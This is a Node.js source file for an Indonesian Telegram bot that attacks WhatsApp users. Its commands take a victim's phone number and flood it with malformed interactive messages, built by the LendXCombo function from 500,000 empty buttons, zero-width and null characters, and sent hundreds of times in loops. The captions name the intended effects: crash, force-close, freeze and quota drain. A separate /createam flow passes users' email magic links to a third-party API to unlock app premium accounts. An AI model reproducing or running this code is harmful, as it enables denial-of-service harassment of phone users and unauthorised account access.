        ctx.chat.id,
        waitMsg.message_id,
        null,
        "✅ Script Anda sudah versi terbaru."
      );
    }

    await ctx.telegram.editMessageText(
      ctx.chat.id,
      waitMsg.message_id,
      null,
      "📢 Pembaruan script tersedia! Ketik /update untuk memperbarui."
    );

  } catch (error) {
    console.error("Error cek update:", error.message);
    ctx.telegram.editMessageText(
      ctx.chat.id,
      waitMsg.message_id,
      null,
      "❌ Belum ada info update script di dalam sistem database kami."
    );
  }
});
// ============================================
// COMMAND /createam
// ============================================
bot.command("createam", async (ctx) => {
    const userId = ctx.from.id;

    // Simpan sesi baru dengan step 'WAITING_EMAIL'
    const statusMsg = await ctx.replyWithHTML(
        `<blockquote>📧 <b>[1/3] Silakan Masukkan Email:</b>\n\nKetik atau paste email Alight Motion Anda di bawah ini.\n\n<i>⏱ Waktu tunggu: 3 menit</i></blockquote>`
    );

    createamSessions.set(userId, {
        step: 'WAITING_EMAIL',
        chatId: ctx.chat.id,
        statusMsgId: statusMsg.message_id,
        timestamp: Date.now()
    });
});

// ============================================
// LISTENER UNTUK MENANGKAP EMAIL DAN MAGIC LINK
// ============================================
bot.on("text", async (ctx, next) => {
    const userId = ctx.from.id;

    // Jika user tidak sedang dalam sesi /createam, lewati ke handler berikutnya
    if (!createamSessions.has(userId)) {
        return next();
    }

    const session = createamSessions.get(userId);
    const text = ctx.message.text.trim();

    // Timeout sesi (3 menit)
    if (Date.now() - session.timestamp > 180000) {
        createamSessions.delete(userId);
        return next();
    }

    // --------------------------------------------
    // TAHAP 1: MENERIMA EMAIL
    // --------------------------------------------
    if (session.step === 'WAITING_EMAIL') {
        if (!text.includes("@")) {
            return ctx.replyWithHTML(
                `<blockquote>❌ <b>Format Email Salah!</b>\n\nSilakan masukkan email yang valid (contoh: <code>nama@gmail.com</code>).</blockquote>`
            );
        }

        // Hapus pesan email yang dikirimkan user agar aman & bersih
        await safeDelete(ctx, ctx.message.message_id);

        const email = text;

        // Update status pesan bot bahwa sedang mengirim Magic Link
        try {
            await ctx.telegram.editMessageText(
                session.chatId,
                session.statusMsgId,
                null,
                `<blockquote>⏳ <b>[2/3] Mengirim Magic Link...</b>\nEmail: <code>${email}</code></blockquote>`,
                { parse_mode: 'HTML' }
            );
        } catch (e) {}

        try {
            // Request Magic Link ke Satriam API
            const res = await axios.post(
                'https://satriam.satriadeveloperz.workers.dev/api/satriam/send-link',
                { email },
                {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                        'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                        'Content-Type': 'application/json',
                        'Origin': 'https://satriam.satriadeveloperz.workers.dev',
                        'Referer': 'https://satriam.satriadeveloperz.workers.dev/'
                    },
                    timeout: 15000
                }
            );

            if (!res.data?.success) {
                createamSessions.delete(userId);
                return ctx.telegram.editMessageText(
                    session.chatId,
                    session.statusMsgId,
                    null,
                    `<blockquote>❌ <b>Gagal mengirim Magic Link!</b>\nStatus: ${res.data?.message || 'Error API'}</blockquote>`,
                    { parse_mode: 'HTML' }
                );
            }

            // Perbarui sesi ke step 'WAITING_LINK'
            createamSessions.set(userId, {
                step: 'WAITING_LINK',
                email: email,
                chatId: session.chatId,
                statusMsgId: session.statusMsgId,
                timestamp: Date.now()
            });

            await ctx.telegram.editMessageText(
                session.chatId,
                session.statusMsgId,
                null,
                `<blockquote>📩 <b>[2/3] Magic Link Terkirim!</b>\n\nSilakan cek inbox email <code>${email}</code>, lalu <b>paste URL Magic Link</b> di sini.\n\n<i>⏱ Waktu tunggu: 3 menit</i></blockquote>`,
                { parse_mode: 'HTML' }
            );

        } catch (err) {
            console.error("Error Send Link:", err.message);
            createamSessions.delete(userId);
            await ctx.telegram.editMessageText(
                session.chatId,
                session.statusMsgId,
                null,
                `<blockquote>❌ <b>Error:</b> ${err.message}</blockquote>`,
                { parse_mode: 'HTML' }
            );
        }

        return; // Hentikan eksekusi di tahap ini
    }

    // --------------------------------------------
    // TAHAP 2: MENERIMA MAGIC LINK
    // --------------------------------------------
    if (session.step === 'WAITING_LINK') {
        if (text.startsWith("http://") || text.startsWith("https://")) {
            // Hapus pesan link dari user
            await safeDelete(ctx, ctx.message.message_id);

            const email = session.email;
            createamSessions.delete(userId);

            try {
                await ctx.telegram.editMessageText(
                    session.chatId,
                    session.statusMsgId,
                    null,
                    `<blockquote>⏳ <b>[3/3] Memverifikasi Magic Link...</b></blockquote>`,
                    { parse_mode: 'HTML' }
                );
            } catch (e) {}

            try {
                const verifyRes = await axios.post(
                    'https://satriam.satriadeveloperz.workers.dev/api/satriam/verify-link',
                    {
                        email: email,
                        magicLink: text
                    },
                    {
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
                            'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                            'Content-Type': 'application/json',
                            'Origin': 'https://satriam.satriadeveloperz.workers.dev',
                            'Referer': 'https://satriam.satriadeveloperz.workers.dev/'
                        },
                        timeout: 15000
                    }
                );

                if (!verifyRes.data?.success) {
                    return ctx.telegram.editMessageText(
                        session.chatId,
                        session.statusMsgId,
                        null,
                        `<blockquote>❌ <b>Verifikasi Gagal!</b>\nLink tidak valid atau sudah kadaluarsa.</blockquote>`,
                        { parse_mode: 'HTML' }
                    );
                }

                const data = verifyRes.data;

                const resultCaption = 
`<blockquote><b>🎉 ALIGHT MOTION PREMIUM CREATED</b>

<b>Email:</b> <code>${email}</code>
<b>UID:</b> <code>${data.uid || '-'}</code>
<b>Plan:</b> ${data.planName || 'Premium'}
<b>Valid Until:</b> ${data.validUntil || 'Lifetime/Active'}
<b>Status:</b> ✅ Success Verified</blockquote>`;

                try {
                    await ctx.telegram.sendPhoto(userId, ACTIVATOR_CONFIG.SUCCESS_IMAGE_URL, {
                        caption: resultCaption,
                        parse_mode: 'HTML'
                    });

                    await ctx.telegram.editMessageText(
                        session.chatId,
                        session.statusMsgId,
                        null,
                        `<blockquote>✅ <b>Aktivasi Berhasil!</b>\n\nDetail akun telah dikirimkan ke <b>Private Message (DM)</b> Anda.</blockquote>`,
                        { parse_mode: 'HTML' }
                    );
                } catch (pmErr) {
                    await ctx.telegram.editMessageText(
                        session.chatId,
                        session.statusMsgId,
                        null,
                        `<blockquote>⚠️ <b>Aktivasi Berhasil, tapi gagal kirim PM!</b>\nSilakan Chat/Start Bot secara privat terlebih dahulu.</blockquote>`,
                        { parse_mode: 'HTML' }
                    );
                }

            } catch (err) {
                console.error("Error Verify Link:", err.message);
                await ctx.telegram.editMessageText(
                    session.chatId,
                    session.statusMsgId,
                    null,
                    `<blockquote>❌ <b>Gagal Verifikasi:</b> ${err.message}</blockquote>`,
                    { parse_mode: 'HTML' }
                );
            }
        } else {
            return next();
        }
    }
});
//============( CASE BUG ) =======\\
bot.command(
  "artahard",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/artahard")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 » Format: /artahard 62×××`);
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let mention = false;

    const processMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Delay Invisible Hard
┊々 Status: Process
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "danger",
              },
            ],
          ],
        },
      }
    );

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 200; i++) {
      await LendUpLah(sock, target);
      await LendUpLah(sock, target);
      await LendUpLah(sock, target);
      await sleep(100);
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Delay Invisible Hard
┊々 Status: Success
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "success",
              },
            ],
          ],
        },
      }
    );
  }
);

bot.command(
  "delaynew",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/delaynew")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 » Format: /delaynew 62×××`);
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let mention = false;

    const processMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Delay Tag Story
┊々 Status: Process
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "danger",
              },
            ],
          ],
        },
      }
    );

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 200; i++) {
      await LendUpLah(sock, target);
      await LendUpLah(sock, target);
      await LendUpLah(sock, target);
      await sleep(100);
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Delay Tag Story
┊々 Status: Success
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "success",
              },
            ],
          ],
        },
      }
    );
  }
);

bot.command(
  "incl",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/incl")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 » Format: /incl 62×××`);
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let mention = false;

    const processMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Crash Chat
┊々 Status: Process
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "danger",
              },
            ],
          ],
        },
      }
    );

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 200; i++) {
      await LendXCombo(sock, target);
      await LendXCombo(sock, target);
      await LendUpLah(sock, target);
      await sleep(100);
    }
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Crash Chat
┊々 Status: Success
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "success",
              },
            ],
          ],
        },
      }
    );
  }
);

bot.command(
  "artabuldo",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/artabuldo")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 » Format: /artabuldo 62×××`);
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let mention = false;

    const processMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Drain Qouta
┊々 Status: Process
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "danger",
              },
            ],
          ],
        },
      }
    );

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 200; i++) {
      await LendUpLah(sock, target);
      await LendXCombo(sock, target);
      await LendUpLah(sock, target);
      await sleep(100);
    }
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Drain Quota
┊々 Status: Success
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "success",
              },
            ],
          ],
        },
      }
    );
  }
);

bot.command(
  "fcios",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/fcios")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 » Format: /fcios 62×××`);
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let mention = false;

    const processMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Forcelose IOS
┊々 Status: Process
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "danger",
              },
            ],
          ],
        },
      }
    );

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 200; i++) {
      await LendXCombo(sock, target);
      await LendXCombo(sock, target);
      await LendXCombo(sock, target);
      await sleep(100);
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Forcelose IOS
┊々 Status: Success
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "success",
              },
            ],
          ],
        },
      }
    );
  }
);

bot.command(
  "sedot",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/sedot")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    const q = ctx.message.text.split(" ")[1];
    if (!q) return ctx.reply(`🪧 » Format: /sedot 62×××`);
    let target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    let mention = false;

    const processMessage = await ctx.telegram.sendPhoto(
      ctx.chat.id,
      thumbnailUrl,
      {
        caption: `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Buldozer Invisible
┊々 Status: Process
\`\`\``,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "danger",
              },
            ],
          ],
        },
      }
    );

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 200; i++) {
      await LendUpLah(sock, target);
      await LendXCombo(sock, target);
      await LendXCombo(sock, target);
      await sleep(100);
    }

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      processMessageId,
      undefined,
      `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Buldozer Invisible
┊々 Status: Success
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "Check ⵢ Target",
                url: `https://wa.me/${q}`,
                style: "success",
              },
            ],
          ],
        },
      }
    );
  }
);

//============( CASE BUG BEBAS SPAM ) =======\\
bot.command(
  "artafc",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/artafc")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 » Format: /artafc 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Forcelose Android
┊々 Status: Processing...
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Succes sending bugs to target`));
            await LendXCombo(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Forcelose Android
┊々 Status: ✅ Success
┊々 Attack By: ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error artafc:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command artafc error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan artafc.");
    }
  }
);

bot.command(
  "lendclx",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/lendclx")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 » Format: /lendclx 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Forcelose Click
┊々 Status: Processing...
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Succes sending bugs to target`));
            await LendXCombo(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Forcelose Click
┊々 Status: ✅ Success
┊々 Attack By: ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error lendclx:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command lendclx error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan lendclx.");
    }
  }
);

bot.command(
  "lendinvis",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/lendinvis")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 » Format: /lendinvis 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Delay Invisible
┊々 Status: Processing...
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Succes sending bugs to target`));
            await LendUpLah(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Delay Invisible
┊々 Status: ✅ Success
┊々 Attack By: ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error lendinvis:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command lendinvis error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan lendinvis.");
    }
  }
);

bot.command(
  "ntainvis",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/ntainvis")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 » Format: /ntainvis 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Delay Invisible V2
┊々 Status: Processing...
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Succes sending bugs to target`));
            await LendUpLah(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Delay Invisible V2
┊々 Status: ✅ Success
┊々 Attack By: ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error lendinvis:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command lendinvis error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan lendinvis.");
    }
  }
);

bot.command(
  "artabc",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/artabc")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 » Format: /artabc 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Blank Click
┊々 Status: Processing...
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Succes sending bugs to target`));
            await LendXCombo(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Blank Click
┊々 Status: ✅ Success
┊々 Attack By: ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error artabc:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command artabc error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan artabc.");
    }
  }
);

bot.command(
  "ntafrz",
  checkWhatsAppConnection,
  checkPremium,
  checkCooldown,
  async ctx => {
    if (isCommandBlocked("/ntafrz")) {
      return ctx.reply("🚫 Command ini sedang dinonaktifkan.");
    }
    try {
      const username = ctx.from.username
        ? `${ctx.from.username}`
        : ctx.from.first_name || "User";

      const q = ctx.message.text.split(" ")[1];

      if (!q) {
        return ctx.replyWithHTML(`🪧 » Format: /ntafrz 62×××`);
      }

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

      const caption = `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Freeze Invisible
┊々 Status: Processing...
\`\`\``;

      const processMessage = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        thumbnailUrl,
        {
          caption: caption,
          parse_mode: "Markdown",
        }
      );

      (async () => {
        try {
          for (let i = 0; i < 5; i++) {
            console.log(chalk.yellow(`✅ Succes sending bugs to target`));
            await LendUpLah(sock, target);
          }

          await ctx.telegram.editMessageCaption(
            ctx.chat.id,
            processMessage.message_id,
            undefined,
            `\`\`\`js
𑁍┊ARTA THE OLYMPUS 14 Gen 2
© 2026 - 2027 | All Rights Reserved      
━━━━━━━━━━━━━━⪼
┊々 Target: ${q}
┊々 Type: Freeze Invisible
┊々 Status: ✅ Success
┊々 Attack By: ${username}
\`\`\``,
            { parse_mode: "Markdown" }
          );
        } catch (err) {
          console.log("error ntafrz:");
          console.log(err);
        }
      })();
    } catch (err) {
      console.log("command ntafrz error:");
      console.log(err);

      ctx.reply("❌ Terjadi error saat menjalankan ntafrz.");
    }
  }
);


//============( FUNCTION ) =======\\
async function LendXCombo(sock, target) {
  try {
    const lend = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "LendInHere"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    nativeFlowResponsMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    const lend2 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "\u200B".repeat(22222)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "{{".repeat(9999)
                            }
                        ]
                    },
                    nativeFlowResponsMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    },
                    interactiveResponsMessage: {
                        body: {
                            text: "\u200B".repeat(50000)
                        },
                        nativeFlowInfo: {
                            buttons: [],
                            buttonsParamsJson: "\u0000".repeat(9000)
                        }
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, lend, {});
    await sock.relayMessage(target, lend2, {});
    console.log(`Proses pengiriman ke ${target} selesai.`);
  } catch (error) {
    console.error(`Terjadi kesalahan: ${error.message}`);
  }
}
//===============( END ) =======||
(async () => {
  await connectDB(); // Cek token di GitHub lebih dulu
  bot.launch();      // Bot BARU jalan kalau token terdaftar
})();